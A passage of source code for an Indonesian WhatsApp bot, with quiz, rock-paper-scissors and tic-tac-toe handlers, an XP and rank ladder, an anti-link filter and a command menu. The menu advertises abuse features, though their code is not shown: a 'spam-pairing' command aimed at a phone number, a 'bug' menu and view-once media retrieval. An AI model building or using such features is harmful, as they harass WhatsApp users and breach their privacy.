ptz.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender]}}, {quoted: kalgans}).then(() => {
db.data.users[m.sender].balance += hadiah;
});
}
}
}
} catch (e) {
return ptz.sendText(m.chat, e.toString(), m);
}

if ((from in tebakgambar2)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar2[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar2[from].jawaban}*`);
delete tebakgambar2[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
ptz.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
users.balance += 150
clearTimeout(waktu);
delete tebakgambar2[from];
} else ptz.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]

if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete caklontong[from];
} else falseR()
}

if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nHadiah: $${hadiah}\n\n${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}`)
users.balance += hadiah
} else falseR()
}
if (budy.toLowerCase() == "nyerah") {
let teks = `*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah\n`
let jwb = jawaban
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
clearTimeout(waktu);
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]

if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan: ${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebakbendera[from];
} else falseR()
}

let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
global.db.data.users[m.sender].balance -= 1000
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await ptz.sendTextWithMentions(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di nomor bot"
➩ wa.me/${botNumber.split('@')[0]}`
await ptz.sendMessage(m.chat, {text: 'Suit telah dikirimkan ke chat\nSilahkan pilih suit di chat masing²', contextInfo: {mentionedJid: [roof.p, roof.p2]}}, {quoted: m})
if (!roof.pilih) await ptz.sendTextWithMentions(roof.p, `*Silahkan pilih dibawah ini :*\n✂ Gunting\n📄 Kertas\n🗿 Batu\n\nContoh jika kamu ingin memilih gunting ketik *Gunting*`, m)
if (!roof.pilih2) await ptz.sendTextWithMentions(roof.p2, `*Silahkan pilih dibawah ini :*\n✂ Gunting\n📄 Kertas\n🗿 Batu\n\nContoh jika kamu ingin memilih gunting ketik *Gunting*`, m)
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await ptz.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
global.db.data.users[m.sender].balance -= 1000
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi pengurangan Rp. 1,000 saldo karna menolak ajakan pemain`
await reply(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(budy.toLowerCase())[0]
roof.text = body
await ptz.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:kalgans})
if (!roof.pilih2) await ptz.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(budy.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await ptz.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await ptz.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await ptz.sendTextWithMentions(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Balance : 1000 '}`)
if (roof.p == win) {
global.db.data.users[roof.p].balance += 1000
} else if (roof.p2 == win) {
global.db.data.users[roof.p2].balance += 1000
}
delete suit[roof.id]
}
}

const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}
const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}
const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}
const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}
const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}
if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
ptz.sendText(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
db.data.users[m.sender].balance -= 100
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -100 balance karna menolak ajakan pemain`
ptz.sendText(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
ptz.sendText(from, the2, m)
global.db.data.users[posi.penantang].balance += posi.hadiah
global.db.data.users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
ptz.sendText(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
ptz.sendText(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
ptz.sendText(from, the5, m)
global.db.data.users[posi.ditantang].balance += posi.hadiah
global.db.data.users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
ptz.sendText(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
ptz.sendText(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}

//Batas Respons Game
//DATABASE 
  
  
  
  if (prefix && command) {
    if (users.registered) {
    if (users.level <= 15) {
        users.exp += Func.randomInt(70, 250)
    } else if (users.level <= 20) {
        users.exp += Func.randomInt(1500, 5000)
    } else if (users.level <= 50) {
        users.exp += Func.randomInt(5000, 10000)
    } else if (users.level <= 100) {
        users.exp += Func.randomInt(5000, 10000)
    } else if (users.level <= 250) {
        users.exp += Func.randomInt(10000, 30000)
    } else if (users.level <= 500) {
        users.exp += Func.randomInt(30000, 50000)
    } else if (users.level <= 800) {
        users.exp += Func.randomInt(50000, 100000)
    } else if (users.level <= 1000) {
        users.exp += Func.randomInt(100000, 2000000)
    } else if (users.level <= 5000) {
        users.exp += Func.randomInt(200000, 500000)
    } else if (users.level <= 10000) {
        users.exp += Func.randomInt(500000, 1000000)
    }
    }
    }
    
    if (settings.levelup) {
    let user = global.db.data.users[m.sender]
    if (!settings.levelup) return !0
    let before = user.level * 1

    while (await levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
    if (user.level <= 2) {
        user.role = 'Newbie ㋡'

    } else if (user.level <= 4) {
        user.role = 'Beginner Grade 1 ⚊¹'

    } else if (user.level <= 6) {
        user.role = 'Beginner Grade 2 ⚊²'

    } else if (user.level <= 8) {
        user.role = 'Beginner Grade 3 ⚊³'

    } else if (user.level <= 10) {
        user.role = 'Beginner Grade 4 ⚊⁴'

    } else if (user.level <= 12) {
        user.role = 'Private Grade 1 ⚌¹'

    } else if (user.level <= 14) {
        user.role = 'Private Grade 2 ⚌²'

    } else if (user.level <= 16) {
        user.role = 'Private Grade 3 ⚌³'

    } else if (user.level <= 18) {
        user.role = 'Private Grade 4 ⚌⁴'

    } else if (user.level <= 20) {
        user.role = 'Private Grade 5 ⚌⁵'

    } else if (user.level <= 22) {
        user.role = 'Corporal Grade 1 ☰¹'

    } else if (user.level <= 24) {
        user.role = 'Corporal Grade 2 ☰²'

    } else if (user.level <= 26) {
        user.role = 'Corporal Grade 3 ☰³'

    } else if (user.level <= 28) {
        user.role = 'Corporal Grade 4 ☰⁴'

    } else if (user.level <= 30) {
        user.role = 'Corporal Grade 5 ☰⁵'

    } else if (user.level <= 32) {
        user.role = 'Sergeant Grade 1 ≣¹'

    } else if (user.level <= 34) {
        user.role = 'Sergeant Grade 2 ≣²'

    } else if (user.level <= 36) {
        user.role = 'Sergeant Grade 3 ≣³'

    } else if (user.level <= 38) {
        user.role = 'Sergeant Grade 4 ≣⁴'

    } else if (user.level <= 40) {
        user.role = 'Sergeant Grade 5 ≣⁵'

    } else if (user.level <= 42) {
        user.role = 'Staff Grade 1 ﹀¹'

    } else if (user.level <= 44) {
        user.role = 'Staff Grade 2 ﹀²'

    } else if (user.level <= 46) {
        user.role = 'Staff Grade 3 ﹀³'

    } else if (user.level <= 48) {
        user.role = 'Staff Grade 4 ﹀⁴'

    } else if (user.level <= 50) {
        user.role = 'Staff Grade 5 ﹀⁵'

    } else if (user.level <= 52) {
        user.role = 'Sergeant Grade 1 ︾¹'

    } else if (user.level <= 54) {
        user.role = 'Sergeant Grade 2 ︾²'

    } else if (user.level <= 56) {
        user.role = 'Sergeant Grade 3 ︾³'

    } else if (user.level <= 58) {
        user.role = 'Sergeant Grade 4 ︾⁴'

    } else if (user.level <= 60) {
        user.role = 'Sergeant Grade 5 ︾⁵'

    } else if (user.level <= 62) {
        user.role = '2nd Lt. Grade 1 ♢¹ '

    } else if (user.level <= 64) {
        user.role = '2nd Lt. Grade 2 ♢²'

    } else if (user.level <= 66) {
        user.role = '2nd Lt. Grade 3 ♢³'

    } else if (user.level <= 68) {
        user.role = '2nd Lt. Grade 4 ♢⁴'

    } else if (user.level <= 70) {
        user.role = '2nd Lt. Grade 5 ♢⁵'

    } else if (user.level <= 72) {
        user.role = '1st Lt. Grade 1 ♢♢¹'

    } else if (user.level <= 74) {
        user.role = '1st Lt. Grade 2 ♢♢²'

    } else if (user.level <= 76) {
        user.role = '1st Lt. Grade 3 ♢♢³'

    } else if (user.level <= 78) {
        user.role = '1st Lt. Grade 4 ♢♢⁴'

    } else if (user.level <= 80) {
        user.role = '1st Lt. Grade 5 ♢♢⁵'

    } else if (user.level <= 82) {
        user.role = 'Major Grade 1 ✷¹'

    } else if (user.level <= 84) {
        user.role = 'Major Grade 2 ✷²'

    } else if (user.level <= 86) {
        user.role = 'Major Grade 3 ✷³'

    } else if (user.level <= 88) {
        user.role = 'Major Grade 4 ✷⁴'

    } else if (user.level <= 90) {
        user.role = 'Major Grade 5 ✷⁵'

    } else if (user.level <= 92) {
        user.role = 'Colonel Grade 1 ✷✷¹'

    } else if (user.level <= 94) {
        user.role = 'Colonel Grade 2 ✷✷²'

    } else if (user.level <= 96) {
        user.role = 'Colonel Grade 3 ✷✷³'

    } else if (user.level <= 98) {
        user.role = 'Colonel Grade 4 ✷✷⁴'

    } else if (user.level <= 100) {
        user.role = 'Colonel Grade 5 ✷✷⁵'

    } else if (user.level <= 102) {
        user.role = 'Brigadier Early ✰'

    } else if (user.level <= 104) {
        user.role = 'Brigadier Silver ✩'

    } else if (user.level <= 106) {
        user.role = 'Brigadier gold ✯'

    } else if (user.level <= 108) {
        user.role = 'Brigadier Platinum ✬'

    } else if (user.level <= 110) {
        user.role = 'Brigadier Diamond ✪'

    } else if (user.level <= 112) {
        user.role = 'Major General Early ✰'

    } else if (user.level <= 114) {
        user.role = 'Major General Silver ✩'

    } else if (user.level <= 116) {
        user.role = 'Major General gold ✯'

    } else if (user.level <= 118) {
        user.role = 'Major General Platinum ✬'

    } else if (user.level <= 120) {
        user.role = 'Major General Diamond ✪'

    } else if (user.level <= 122) {
        user.role = 'Lt. General Early ✰'

    } else if (user.level <= 124) {
        user.role = 'Lt. General Silver ✩'

    } else if (user.level <= 126) {
        user.role = 'Lt. General gold ✯'

    } else if (user.level <= 128) {
        user.role = 'Lt. General Platinum ✬'

    } else if (user.level <= 130) {
        user.role = 'Lt. General Diamond ✪'

    } else if (user.level <= 132) {
        user.role = 'General Early ✰'

    } else if (user.level <= 134) {
        user.role = 'General Silver ✩'

    } else if (user.level <= 136) {
        user.role = 'General gold ✯'

    } else if (user.level <= 138) {
        user.role = 'General Platinum ✬'

    } else if (user.level <= 140) {
        user.role = 'General Diamond ✪'

    } else if (user.level <= 142) {
        user.role = 'Commander Early ★'

    } else if (user.level <= 144) {
        user.role = 'Commander Intermediate ⍣'

    } else if (user.level <= 146) {
        user.role = 'Commander Elite ≛'

    } else if (user.level <= 148) {
        user.role = 'The Commander Hero ⍟'

    } else if (user.level <= 152) {
        user.role = 'Legends 忍'

    } else if (user.level <= 154) {
        user.role = 'Legends 忍'

    } else if (user.level <= 156) {
        user.role = 'Legends 忍'

    } else if (user.level <= 158) {
        user.role = 'Legends 忍'

    } else if (user.level <= 160) {
        user.role = 'Legends 忍'

    } else if (user.level <= 162) {
        user.role = 'Legends 忍'

    } else if (user.level <= 164) {
        user.role = 'Legends 忍'

    } else if (user.level <= 166) {
        user.role = 'Legends 忍'

    } else if (user.level <= 168) {
        user.role = 'Legends 忍'

    } else if (user.level <= 170) {
        user.role = 'Legends 忍'

    } else if (user.level <= 172) {
        user.role = 'Legends 忍'

    } else if (user.level <= 174) {
        user.role = 'Legends 忍'

    } else if (user.level <= 176) {
        user.role = 'Legends 忍'

    } else if (user.level <= 178) {
        user.role = 'Legends 忍'

    } else if (user.level <= 180) {
        user.role = 'Legends 忍'

    } else if (user.level <= 182) {
        user.role = 'Legends 忍'

    } else if (user.level <= 184) {
        user.role = 'Legends 忍'

    } else if (user.level <= 186) {
        user.role = 'Legends 忍'

    } else if (user.level <= 188) {
        user.role = 'Legends 忍'

    } else if (user.level <= 190) {
        user.role = 'Legends 忍'

    } else if (user.level <= 192) {
        user.role = 'Legends 忍'

    } else if (user.level <= 194) {
        user.role = 'Legends 忍'

    } else if (user.level <= 196) {
        user.role = 'Legends 忍'

    } else if (user.level <= 198) {
        user.role = 'Legends 忍'

    } else if (user.level <= 200) {
        user.role = 'Legends 忍'

    } else if (user.level <= 210) {
        user.role = 'Legends 忍'

    } else if (user.level <= 220) {
        user.role = 'Legends 忍'

    } else if (user.level <= 230) {
        user.role = 'Legends 忍'

    } else if (user.level <= 240) {
        user.role = 'Legends 忍'

    } else if (user.level <= 250) {
        user.role = 'Legends 忍'

    } else if (user.level <= 260) {
        user.role = 'Legends 忍'

    } else if (user.level <= 270) {
        user.role = 'Legends 忍'

    } else if (user.level <= 280) {
        user.role = 'Legends 忍'

    } else if (user.level <= 290) {
        user.role = 'Legends 忍'

    } else if (user.level <= 300) {
        user.role = 'Legends 忍'

    } else if (user.level <= 310) {
        user.role = 'Legends 忍'

    } else if (user.level <= 320) {
        user.role = 'Legends 忍'

    } else if (user.level <= 330) {
        user.role = 'Legends 忍'

    } else if (user.level <= 340) {
        user.role = 'Legends 忍'

    } else if (user.level <= 350) {
        user.role = 'Legends 忍'
    } else if (user.level <= 360) {
        user.role = 'Legends 忍'

    } else if (user.level <= 370) {
        user.role = 'Legends 忍'

    } else if (user.level <= 380) {
        user.role = 'Legends 忍'

    } else if (user.level <= 390) {
        user.role = 'Legends 忍'

    } else if (user.level <= 400) {
        user.role = 'Legends 忍'

    } else if (user.level <= 410) {
        user.role = 'Legends 忍'

    } else if (user.level <= 420) {
        user.role = 'Legends 忍'

    } else if (user.level <= 430) {
        user.role = 'Legends 忍'

    } else if (user.level <= 440) {
        user.role = 'Legends 忍'

    } else if (user.level <= 450) {
        user.role = 'Legends 忍'

    } else if (user.level <= 460) {
        user.role = 'Legends 忍'

    } else if (user.level <= 470) {
        user.role = 'Legends 忍'

    } else if (user.level <= 480) {
        user.role = 'Legends 忍'

    } else if (user.level <= 490) {
        user.role = 'Legends 忍'

    } else if (user.level <= 500) {
        user.role = 'Legends 忍'

    } else if (user.level <= 600) {
        user.role = 'Legends 忍'

    } else if (user.level <= 700) {
        user.role = 'Legends 忍'

    } else if (user.level <= 800) {
        user.role = 'Legends 忍'

    } else if (user.level <= 900) {
        user.role = 'Legends 忍'

    } else if (user.level <= 1000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 2000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 3000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 4000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 5000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 6000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 7000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 8000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 9000) {
        user.role = 'Legends 忍'

    } else if (user.level <= 10000) {
        user.role = 'Legends 忍'

    }
    let role = user.role
    if (before !== user.level) {
        let {
            min,
            xp,
            max
        } = await levelling.xpRange(user.level, global.multiplier);
        let ppUrl = await ptz
            .profilePicture(m.sender, "image")
            .catch(() => "https://telegra.ph/file/ce213c888d1dc6f7fcdbf.jpg");
        let pp = Buffer.from(await (await fetch(ppUrl)).arrayBuffer());
        let curr = user.exp - min;

      

// Pastikan mendefinisikan `user`, `pp`, `curr`, `xp`, dan `m` di luar kode ini.
let chating = `*Congratulations ${pushname}*\n\n┌ ◦ Progress: [ *${before}* ] ➠ [ *${user.level}* ]\n│ ◦ Level: [ *${user.level}* ]\n└ ◦ Unlocked: *${user.role}*\n`;

// Background
ctx.fillStyle = '#2B2E35';
ctx.fillRect(0, 0, canvas.width, canvas.height);

// Load avatar image
loadImage(pp).then((avatar) => {
    // Draw avatar
    ctx.drawImage(avatar, 25, 25, 200, 200);
    
    // Text styles and levels
    ctx.fillStyle = '#FFFFFF';
    ctx.font = '30px Arial';
    ctx.fillText(m.pushName, 250, 100);
    
    ctx.font = '25px Arial';
    ctx.fillText(`Level: ${user.level}`, 250, 140);
    ctx.fillText(`XP: ${curr}/${xp}`, 250, 180);

    // Convert canvas to buffer
    const buffer = canvas.toBuffer();
    
    // Send image
    ptz.sendImage(m.chat, buffer, chating, m);
});

    }
    }

const totalFitur = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

if (chats.antilink && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`chat.whatsapp.com`)) {
await ptz.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`Link Terdeteksi Jadi Nya Di Delete`)
}
if (chats.antilink && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`chat.whatsapp.com`)) {
await ptz.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
}
//BATAS DATABASE 
switch(command) {
case'menu':{
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const formattedTotalMem = formatSize(totalMem);
if (args.length < 1) return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.

${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case

${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

${hiasan}menu all
${hiasan}menu owner
${hiasan}menu main
${hiasan}menu download
${hiasan}menu convert
${hiasan}menu search
${hiasan}menu group
${hiasan}menu game
${hiasan}menu ai
${hiasan}menu tools
${hiasan}menu store
${hiasan}menu bug
${hiasan}menu jadibot
`)
if (args[0] === "all") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Owner Menu*
• ${prefix}upch audio
• ${prefix}upch video
• ${prefix}blacklist
• ${prefix}unblacklist
• ${prefix}delprem [ Tag Number ]
• ${prefix}addprem [ Tag Number ]
• ${prefix}createredeem [ name|3 ]
• ${prefix}addexp [ Tag Number ]
• ${prefix}banuser [ Number ]
• ${prefix}unbanuser [ Number ]
• ${prefix}addbalance [ Number ]
• ${prefix}addlimit [ Number ]
• ${prefix}spam-pairing [ Number ]
• ${prefix}addcase
• ${prefix}dellcase
• ${prefix}banchat
• ${prefix}unbanchat
• ${prefix}listprem 
• ${prefix}getcase
• ${prefix}sendcase
• ${prefix}self
• ${prefix}setreply
• ${prefix}runtime
• ${prefix}cls [ Reply Sticker ]
• ${prefix}del [ Reply ]
• ${prefix}public
• ${prefix}backup
• ${prefix}delsesi
• ${prefix}backupdb
• ${prefix}setppbot [ Send Image ]
• ${prefix}setbotname

*Main Menu*
• ${prefix}redeem 
• ${prefix}daftar
• ${prefix}totalfitur 
• ${prefix}me
• ${prefix}claim
• ${prefix}bulanan
• ${prefix}ping
• ${prefix}saldo
• ${prefix}tqto [ Developer]
• ${prefix}owner [ Developer]
• ${prefix}transfer
• ${prefix}saving
• ${prefix}report [ Kalo Fitur Eror ]

*Download Menu*
• ${prefix}spotifydl [ Link ]
• ${prefix}play [ Question ]
• ${prefix}audio [ Reply ]
• ${prefix}video [ Reply ]
• ${prefix}mediafire [ Link ]
• ${prefix}tiktok [ Link ]
• ${prefix}ytmp4 [ Link ]
• ${prefix}ytmp3 [ Link ]

*Tools Menu*
• ${prefix}removebg
• ${prefix}translate
• ${prefix}gitclone
• ${prefix}tts
• ${prefix}enc
• ${prefix}getpp [ Reply ]
• ${prefix}rvo
• ${prefix}ocr [ Reply Image ]

*Convert Menu*
• ${prefix}smeme [ Text ]
• ${prefix}sticker [ Reply Image ]
• ${prefix}qc [ Text ]
• ${prefix}toimg [ Reply Sticker ]
• ${prefix}tovn [ Reply video ]
• ${prefix}tourl [ Reply Image ]
• ${prefix}searchaubdo
• ${prefix}remini [ Reply Image ]
• ${prefix}hd [ Image ]
• ${prefix}tovid [ Reply Sticker ]
• ${prefix}upvidey [ Reply Video ]
• ${prefix}stext [ Question ]

*Search Menu*
• ${prefix}play2 [ Question ]
• ${prefix}gimage [ Question ]
• ${prefix}tiktoks [ Question ]
• ${prefix}spotifysearch [ Judul ]
